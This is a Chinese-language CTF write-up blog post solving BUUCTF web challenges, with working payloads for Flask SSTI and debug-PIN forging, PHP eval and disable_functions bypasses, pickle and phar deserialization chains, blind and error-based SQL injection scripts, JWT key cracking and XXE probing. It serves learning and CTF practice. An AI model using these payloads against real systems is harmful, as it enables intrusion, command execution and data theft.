---
title: "BUUCTF Web Writeup 5"
date: 2022-08-31T17:33:08+08:00
lastmod: 2022-08-31T17:33:08+08:00
draft: true
author: "X1r0z"

tags: ['ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录...

<!--more-->

## [GYCTF2020]FlaskApp

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131535730.png)

提示如下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131535892.png)

参考文章 [https://xz.aliyun.com/t/8092](https://xz.aliyun.com/t/8092)

大致就是说, 一般情况下同一台机器生成的 flask pin 是一样的, 我们可以通过 ssti 读取对应文件, 然后构造 pin 登录, 进入 debug 模式下的交互式终端, 最终 getshell

base64 解密的时候随便输点东西

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131605529.png)

点击爆出的源码右边的 logo 会显示如下内容

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131606522.png)

很明显这个 flask app 开启了 debug 模式

回到之前的报错代码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131610362.png)

使用了 `render_template_string` 进行渲染

填入 base64 编码后的 `{{ config }}`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131612172.png)

存在 ssti

过滤了 \_\_import\_\_ os popen 之类的关键词, 可以拼接绕过 (这时候其实可以非预期了...)

根据报错信息可以知道环境是 python3, 构造下 payload

先读取 /etc/passwd

```python
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}
{%endif%}
{%endfor%}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131614148.png)

推测用户是 flaskweb

然后在报错信息中找到 app.py 的路径

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131615112.png)

读取 mac 地址

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131616558.png)

用 `int('bea35d10966d',16)` 转成十进制后为 `209608850314861`

最后是读取系统 id, 这个在不同 flask 版本 (2020.1.5 前后) 的拼接方式还不太一样... 参考文章里写的比较详细

测试的时候发现直接读取 /etc/machine-id 就行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131621946.png)

利用文章里给出的脚本生成 pin

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb'# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
    '209608850314861',# str(uuid.getnode()),  /sys/class/net/ens33/address
    '1408f836b0ca514d796cbf8960e45fa1'# get_machine_id(), /etc/machine-id
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

```
273-975-565
```

输入后得到交互式终端

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131622346.png)

非预期解的方式是直接字符串拼接绕过过滤, 然后导入 os 执行命令

```python
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x.__init__.__globals__['__builtins__']['__imp' + 'ort__']('o'+'s').__dict__['po' + 'pen']('cat /this_is_the_f'+'lag.txt').read() }}
{%endif%}
{%endfor%}
```

## [极客大挑战 2019]RCE ME

```php
<?php
error_reporting(0);
if(isset($_GET['code'])){
  $code=$_GET['code'];
  if(strlen($code)>40){
      die("This is too Long.");
   }
  if(preg_match("/[A-Za-z0-9]+/",$code)){
      die("NO.");
    }
  @eval($code);
}
else{
  highlight_file(__FILE__);
}
?>
```

考察无字母数字 webshell

php7 环境, 可以直接用取反

```php
<?php
echo urlencode(~"assert");
echo "<br/>";
echo urlencode(~'eval($_REQUEST[1]);');
?>
```

使用 system 执行命令失败了, 估计是开了 disable_functions, 换成了一句话

```
(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);
```

看一下 phpinfo

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131720790.png)

禁用了一大堆命令执行相关的函数...

蚁剑连接后看到了 flag readflag 两个文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131719800.png)

直接查看 /flag 为空, 猜测是要运行 readflag 这个命令才行, 所以需要 bypass disable_functions

这里用的是 php7 backtrace UAF

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131722581.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131722031.png)

## [MRCTF2020]套娃

右键源代码

```php
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
```

利用的是 php 字符串解析的特性, 之前也遇到过

[https://www.freebuf.com/articles/web/213359.html](https://www.freebuf.com/articles/web/213359.html)

将 `b_u_p_t` 改成 `b.u.p.t`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131748083.png)

还需要绕过正则, 加一个 `%0a` 就可以了, 因为这里默认是单行匹配, 不会匹配到换行符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131749532.png)

访问 secrettw.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131749312.png)

aaencode, 在 F12 控制台中输入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131749938.png)

post 一下

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209131750817.png)

```php
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?>
```

检测 ip 的原理经测试发现利用的是 `Client-IP`, 2333 的传参可以用 data 协议

然后 change 这里很容易就可以写出对应的逆函数

```php
<?php
function encode($v){
  $re = '';
  for ($i=0;$i<strlen($v);$i++){
    $re .= chr(ord($v[$i]) - $i*2);
  }
  return base64_encode($re);
}

echo encode('php://filter/read=convert.base64-encode/resource=flag.php');
?>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209140859724.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209140859604.png)

## [WUSTCTF2020]颜值成绩查询

简单 sql 注入

```python
import time
import requests

url = 'http://4970b328-dd5a-492d-bd32-f084c1f25f13.node4.buuoj.cn:81/index.php?stunum=1'

dicts = ',{}-0123456789abcdefgl'

flag = ''

for i in range(1,100):
    for s in dicts:
        time.sleep(0.5)
        payload = '/**/and/**/ascii(substr((select/**/group_concat(flag,value)/**/from/**/flag),{},1))={}'.format(i,ord(s))
        res = requests.get(url + payload, timeout=30)
        if 'admin' in res.text:
            flag += s
            print(flag)
```

## [FBCTF2019]RCEService

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209141911939.png)

一开始 cmd 怎么传也不行, 看了 wp 才知道 get 需要这样传参

```
?cmd={"cmd":"ls"}
```

题目源码找不出来, 但是看原题的 wp 是有源码的, 不知道什么情况...

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

putenv 相当于一个简陋的沙盒, 让 shell 默认从 `/home/rceservice/jail` 下寻找命令, 后面看的时候发现这个目录下只有一个 ls, 但其实使用绝对路径执行命令 (/bin/cat) 就能够绕过限制了

is_string 限制了传参不能为数组, 所以这里的关键点是如何绕过 `preg_match`

其中正则使用了 `.*`, 而且后面跟了一大堆需要过滤的字符, 可以尝试回溯绕过

查找后发现 flag 在 /home/rceservice/flag 里面, 然后通过绝对路径指定 cat

```python
import requests
import json

url = 'http://d74b595f-f641-43c5-87fb-36ddfabc88f0.node4.buuoj.cn:81/'

data = {
    "cmd": r'{"cmd":"/bin/cat /home/rceservice/flag","aa":"' + 'a'*1000000 +'"}'
}

res = requests.post(url,data=data)
print(res.text)
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209141912828.png)

另外一种方式是用换行符 `%0a` 绕过, 因为 `.` 不匹配换行符

参考文章 [https://www.cnblogs.com/20175211lyz/p/12198258.html](https://www.cnblogs.com/20175211lyz/p/12198258.html)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209141915616.png)

```
cmd={%0a"cmd":"/bin/cat%20/home/rceservice/flag"%0a}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209141919437.png)

不过还不太清楚为啥 `%0a` 要加在大括号里面...

## [Zer0pts2020]Can you guess it?

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

考察 basename 的绕过, 源码后面的 hash_equals 应该没有办法绕过 (障眼法?)

参考文章 [https://www.cnblogs.com/yesec/p/15429527.html](https://www.cnblogs.com/yesec/p/15429527.html)

>With the default locale setting "C", basename() drops non-ASCII-chars at the beginning of a filename.
>在使用默认语言环境设置时，basename() 会删除文件名开头的非 ASCII 字符。

测试后发现非 ASCII 字符必须要加在 `/` 的后面, 例如

```
/index.php/NON_ASCII
/index.php/NON_ASCIIindex.php
```

fuzz 一下非 ASCII 字符

```php
<?php
for($i=0;$i<255;$i++){
  $filename = 'config.php/'.chr($i);
  if (basename($filename) === 'config.php'){
    echo urlencode(chr($i));
    echo "<br/>";
  }
}
?>
```

```
%2F
%5C
%81
%82
%83
......
%FD
%FE
%FF
```

`%2F` 是 `/`, 在正则的过滤名单里, `%5C` 是 `\`, 但实际测试发现会读取 `\` 这个不存在的文件

其余的字符都可以绕过, 这里用 `%FF`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209141950448.png)

## [CISCN2019 华北赛区 Day1 Web2]ikun

buu 提示是 python pickle 反序列化

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150944649.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150945400.png)

猜测可能是要买 lv6 的账号, 翻了几页发现还挺多的, 于是用脚本跑一下

```python
import requests
import time

for i in range(1,501):
    time.sleep(0.2)
    url = 'http://93325b5c-aa6b-4779-8b56-fa3d3561c79d.node4.buuoj.cn:81/shop?page=' + str(i)
    res = requests.get(url)
    if 'lv6.png' in res.text:
        print('FOUND!',i)
        break
    else:
        print(i)
```

跑出来在第 181 页

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150946823.png)

购买的时候要登陆, 先注册一个账号

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150947373.png)

加入购物车

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150947832.png)

钱不够... 抓包看看能不能改价格

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150949213.png)

更改 price 一直显示操作失败, 改 discount 就可以了

之后会跳转到 /b1g_m4mber 这个地址

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150950488.png)

去爆破了一下 admin 的密码, 尝试 sql 注入都失败了

想着是不是伪造 cookie, 结果倒是发现了 jwt

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150951314.png)

参考文章如下

[https://si1ent.xyz/2020/10/21/JWT%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AE%9E%E6%88%98/](https://si1ent.xyz/2020/10/21/JWT%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AE%9E%E6%88%98/)

jwt.io 在线解密

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209150953783.png)

思路应该是构造 username=admin

尝试把加密算法设置为 None, 结果报了 500

然后尝试爆破 jwt key (后期看 wp 发现依据是 jwt 长度较短?)

[https://github.com/brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151006394.png)

key 为 1Kun

然后去 jwt.io 生成 admin 的 jwt token

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151006884.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151007132.png)

发现 www.zip, 下载解压

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151007425.png)

Admin.py

```python
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

存在 pickle 反序列化, payload 如下

```
c__builtin__
eval
p0
(S"__import__('os').popen('cat /flag.txt').read()"
p1
tp2
Rp3
.
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151024676.png)

post 请求的时候需要加上 `_xsrf`, 我就在之前的请求包里面随便找了一个, 不加的话会返回 403

## [CSCCTF 2019 Qual]FlaskLight

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151041507.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151041381.png)

get 传参 search=123

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151042137.png)

猜测有 ssti

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151042100.png)

之后就是用 builtins + eval 执行命令

测试后发现过滤了 globals, 但是 request.args 以及各种符号没有被过滤

payload 如下

```python
{{ ''[request.args.a][request.args.b][-1][request.args.c]()[59][request.args.d][request.args.e][request.args.f][request.args.g](request.args.h) }}
```

get 传参

```
&a=__class__&b=__mro__&c=__subclasses__&d=__init__&e=__globals__&f=__builtins__&g=eval&h=__import__('os').popen('whoami').read()
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151043116.png)

看 wp 的时候发现还可以用 subprocess.Popen 执行命令

```python
{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```

另外还有类似 `__init__["__glo"+"bals__"]` 的拼接, 未测试

## [NCTF2019]True XML cookbook

跟之前有一题差不多, 也是 xxe

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151426644.png)

读取 /flag 提示找不到文件, 猜测可能是在内网中

下面是一些可能获取到内网 ip 的敏感文件

```
/etc/network/interfaces
/etc/hosts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/net/dev
/proc/net/fib_trie
```

这题弄了好久, arp 表里的地址不行, 反而是 fib_trie 里的能够得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151427770.png)

爆破一下内网网段

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151428664.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151428684.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151428578.png)

## [GWCTF 2019]枯燥的抽奖

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151507920.png)

check.php

```php
5ZedaSs3I5

<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

考察伪随机数漏洞

先设置一个 0-999999999 的种子, 然后调用 20 次 mt_rand 从大小写字母和数字中截取内容拼接得到 str

str 截取 0-10 位后就是 `5ZedaSs3I5`

伪随机数的相关文章链接这里就不写了, 之前也见过几次

最主要的还是 `php_mt_seed` 工具的使用

```
php_mt_seed xxx # 其中 xxx 为用 mt_srand 播种后生成的第一个伪随机数

php_mt_seed a b c d ... # a-b 为生成的随机数的范围, c-d 对应 mt_rand(c,d)
```

其中第二种使用方法可以设置多个随机数序列, 然后依靠这个序列得到最初生成的种子

首先根据源码生成能够被 `php_mt_seed` 识别的格式

```python
d = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ' # length:62
c = '5ZedaSs3I5'

output = ''

for s in c:
    output += str(d.index(s)) + ' ' + str(d.index(s)) + ' 0 61 '
print(output)
```

```
31 31 0 61 61 61 0 61 4 4 0 61 3 3 0 61 0 0 0 61 54 54 0 61 18 18 0 61 29 29 0 61 44 44 0 61 31 31 0 61
```

然后跑一下

```
./php_mt_seed 31 31 0 61 61 61 0 61 4 4 0 61 3 3 0 61 0 0 0 61 54 54 0 61 18 18 0 61 29 29 0 61 44 44 0 61 31 31 0 61
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151526370.png)

本地生成完整的字符串 (注意 php 版本)

```php
<?php
mt_srand(664291815);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo $str;
?>
```

提交得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209151528792.png)

## [CISCN2019 华北赛区 Day1 Web1]Dropbox

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209160847039.png)

登录和注册的地方都没有 sql 注入

先注册一个 test 用户登录看看

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209160848308.png)

左上角可以上传文件

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209160849033.png)

有下载和删除两个选项

先看看下载

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209160850126.png)

然后把源码都弄下来

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209160850132.png)

download.php

```php

<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>
```

class.php

```php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

其中 File 类里面的 open 方法调用了 file_exists 和 is_dir

加上 buu 提示的 phar, 应该是 phar 反序列化

然后看一下 User 类

```php
public function __destruct() {
    $this->db->close();
}
```

其中的 close 和 File 类中的 close 同名, 利用这里的条件可以触发 `file_get_contents`

不过问题在于直接调用会没有回显

绕了一圈发现 FileList 类中的 `__call` 和 `__destruct` 有点意思

```php
public function __call($func, $args) {
    array_push($this->funcs, $func);
    foreach ($this->files as $file) {
        $this->results[$file->name()][$func] = $file->$func();
    }
}

public function __destruct() {
    $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
    $table .= '<thead><tr>';
    foreach ($this->funcs as $func) {
        $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
    }
    $table .= '<th scope="col" class="text-center">Opt</th>';
    $table .= '</thead><tbody>';
    foreach ($this->results as $filename => $result) {
        $table .= '<tr>';
        foreach ($result as $func => $value) {
            $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
        }
        $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
        $table .= '</tr>';
    }
    echo $table;
}
```

这里的 `$results` 存储着每一个 File 对象调用 `$func()` 方法返回的结果

而且 `__destruct` 方法会将 `$results` 的结果输出

所以我们可以通过 User 中的 `$this->db->close()` 触发 FileList 类的 `__call`, 然后继续对每一个 File 调用 `close`, 最后在析构的时候将 `file_get_contents` 返回的结果输出

利用链如下

```php
<?php

class User{
    public $db;
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    function __construct($files, $results, $funcs){
        $this->files = $files;
        $this->results = $results;
        $this->funcs = $funcs;
    }
}

class File{
    public $filename;
}


$c = new File();
$c->filename = '/flag.txt';

$b = new FileList(array($c),array('flag.txt'=>array()),array());

$a = new User();
$a->db = $b;

$phar =new Phar("phar.phar"); 
$phar->startBuffering();
$phar->setStub("<?php XXX __HALT_COMPILER(); ?>");
$phar->setMetadata($a); 
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>
```

生成 phar 文件后改后缀为 jpg 上传, 然后在 download.php 里指定 `filename=phar://./phar.jpg` 触发反序列化

结果读取失败了... 试了 flag 文件也不行, 原因是这一条代码

```php
ini_set("open_basedir", getcwd() . ":/etc:/tmp");
```

open_basedir 能够绕过的基础是代码执行, 但这里只有 `file_get_contents` 能用, 绕不过去

于是又看了一会, 发现还有删除的操作

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161006057.png)

delete.php

```php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

这次里面没有 open_basedir 的限制, 而且跟 download.php 一样调用了 `$file->open($filename)`

最终从这个地方触发反序列化

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161003806.png)

## [RCTF2015]EasySQL

15 年的题... 

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161136787.png)

先注册一个用户, 这里用双引号, 之前用单引号的时候不能报错 (后面看到官方 wp 里写到注册 `aaa\` 用户, 也是一种检测方法)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161137730.png)

下面的几个链接测试后发现没有注入...

看看个人中心

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161147067.png)

修改密码

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161148761.png)

有注入, 测试后发现 and * 和空格都被过滤了, 可以用括号绕过

最终构造的 payload 如下

```
1"&&(updatexml(1,concat(0x7e,(select(user())),0x7e),1))#
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202209161151930.png)

后面就是常规的查表查字段

查数据的时候发现程序过滤了 substr substring mid left right 这些字符串截取的函数, 而且 updatexml 存在最大 32 位的长度限制

一种思路是写脚本盲注

另一种思路是利用 replace 替换掉之前已经查出的内容, 这样再查询返回的结果就是 32 位以后的内容了

因为一直重复 register login changepwd 的操作比较麻烦, 就写了个脚本

```python
import requests

session = requests.session()

def register(sql):
    url = 'http://f3418ca6-ca1d-4c29-9a4b-f268e01a9fea.node4.buuoj.cn:81/register.php'
    data = {
    'username': sql,
    'password': '1',
    'email': '1'
    }
